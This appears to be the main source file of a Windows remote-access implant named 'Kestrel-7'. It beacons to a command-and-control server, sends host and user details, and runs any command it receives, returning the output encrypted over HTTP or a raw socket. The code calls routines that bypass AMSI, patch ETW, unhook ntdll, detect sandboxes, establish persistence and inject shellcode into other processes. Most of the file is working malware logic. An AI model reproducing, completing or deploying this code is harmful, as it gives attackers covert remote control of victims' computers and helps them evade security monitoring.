// main.cpp - Kestrel-7 Windows 11 Enterprise Agent
// Architecture: Modular, Memory-Only Evasion, CNG Cryptography, WinHTTP/TCP Transport
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

// ---------- DEFAULT AGENT CONFIGURATION ----------
#define C2_HOST_W L"192.168.1.100"
#define C2_HOST_A "192.168.1.100"
#define C2_PORT 443
#define BEACON_INTERVAL_MS 5000
#define JITTER_MS 1500
#define ENCRYPTION_KEY "Kestrel7_Win11_RevShell_2026"
#define MUTEX_NAME L"Global\\{K7-8A3F1E-9C2D-4E5F-8A1B-3C4D5E6F7A8B}"

// ---------- EXTERNAL LINKAGE ----------
extern "C" {
    BOOL UnhookNtdll();
    void BypassAMSI();
    void PatchETW();
    BOOL CheckSandboxArtifacts();
    void EstablishPersistence();
    void ExecuteCommand(const char* cmd, char* output, int* outLen);
    BOOL InjectShellcodeRemote(DWORD pid, const unsigned char* shellcode, DWORD shellcodeLen);
    BOOL EarlyBirdInject(LPCSTR targetExe, const unsigned char* shellcode, DWORD shellcodeLen);
    void EncryptPayload(unsigned char* data, int len, unsigned char* key, int keyLen);
    void DecryptPayload(unsigned char* data, int len, unsigned char* key, int keyLen);
    BOOL HttpPostData(const wchar_t* host, int port, const wchar_t* endpoint, 
                      const unsigned char* inData, DWORD inLen, 
                      unsigned char* outData, DWORD* outLen);
    BOOL SocketPostData(const char* host, int port, 
                        const unsigned char* inData, DWORD inLen, 
                        unsigned char* outData, DWORD* outLen);
}

static HANDLE g_hMutex = NULL;
static char g_beaconId[64] = { 0 };

BOOL IsSingleInstance() {
    g_hMutex = CreateMutexW(NULL, FALSE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (g_hMutex) CloseHandle(g_hMutex);
        return FALSE;
    }
    return TRUE;
}

void BuildTelemetry(char* buf, size_t bufSize) {
    char hostname[128] = { 0 };
    DWORD hostLen = sizeof(hostname);
    GetComputerNameA(hostname, &hostLen);
    
    char username[128] = { 0 };
    DWORD userLen = sizeof(username);
    GetUserNameA(username, &userLen);
    
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    const char* arch = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86";
    
    snprintf(buf, bufSize,
             "{\"beacon\":\"%s\",\"hostname\":\"%s\",\"user\":\"%s\",\"arch\":\"%s\",\"pid\":%lu}",
             g_beaconId, hostname, username, arch, GetCurrentProcessId());
}

void ProcessCommand(char* rawCmd) {
    if (!rawCmd || strlen(rawCmd) == 0) return;
    
    // Check command structure: e.g. "cmd <args>" or JSON
    if (strncmp(rawCmd, "sleep", 5) == 0) {
        return;
    } else if (strncmp(rawCmd, "persist", 7) == 0) {
        EstablishPersistence();
    } else if (strncmp(rawCmd, "kill", 4) == 0) {
        if (g_hMutex) CloseHandle(g_hMutex);
        ExitProcess(0);
    } else {
        char output[8192] = { 0 };
        int outLen = sizeof(output);
        ExecuteCommand(rawCmd, output, &outLen);
        
        if (outLen > 0) {
            unsigned char key[32];
            memcpy(key, ENCRYPTION_KEY, 32);
            EncryptPayload((unsigned char*)output, outLen, key, 32);
            
            // Return command output to C2 /results
            DWORD respLen = 0;
            if (!HttpPostData(C2_HOST_W, C2_PORT, L"/results", (const unsigned char*)output, (DWORD)outLen, NULL, &respLen)) {
                SocketPostData(C2_HOST_A, C2_PORT, (const unsigned char*)output, (DWORD)outLen, NULL, &respLen);
            }
        }
    }
}

void RunBeaconCycle() {
    char telemetry[2048] = { 0 };
    BuildTelemetry(telemetry, sizeof(telemetry));
    
    int tLen = (int)strlen(telemetry);
    unsigned char key[32];
    memcpy(key, ENCRYPTION_KEY, 32);
    
    // Encrypt telemetry in-place
    EncryptPayload((unsigned char*)telemetry, tLen, key, 32);
    
    unsigned char responseBuf[4096] = { 0 };
    DWORD respLen = sizeof(responseBuf);
    
    BOOL success = HttpPostData(C2_HOST_W, C2_PORT, L"/beacon", 
                                (const unsigned char*)telemetry, (DWORD)tLen, 
                                responseBuf, &respLen);
    if (!success) {
        respLen = sizeof(responseBuf);
        success = SocketPostData(C2_HOST_A, C2_PORT, 
                                 (const unsigned char*)telemetry, (DWORD)tLen, 
                                 responseBuf, &respLen);
    }
    
    if (success && respLen > 0) {
        DecryptPayload(responseBuf, (int)respLen, key, 32);
        responseBuf[respLen] = 0;
        ProcessCommand((char*)responseBuf);
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (!IsSingleInstance()) return 0;
    if (CheckSandboxArtifacts()) {
        Sleep(10000);
    }
    
    // Execute memory evasion patches
    UnhookNtdll();
    BypassAMSI();
    PatchETW();
    
    if (lpCmdLine && (strstr(lpCmdLine, "--install") || strstr(lpCmdLine, "-i"))) {
        EstablishPersistence();
    }
    
    srand((unsigned int)time(NULL));
    snprintf(g_beaconId, sizeof(g_beaconId), "K7-WIN11-%lu-%04x", GetCurrentProcessId(), rand() % 0xFFFF);
    
    while (TRUE) {
        RunBeaconCycle();
        
        int jitter = (JITTER_MS > 0) ? (rand() % JITTER_MS) : 0;
        Sleep(BEACON_INTERVAL_MS + jitter);
    }
    
    return 0;
}
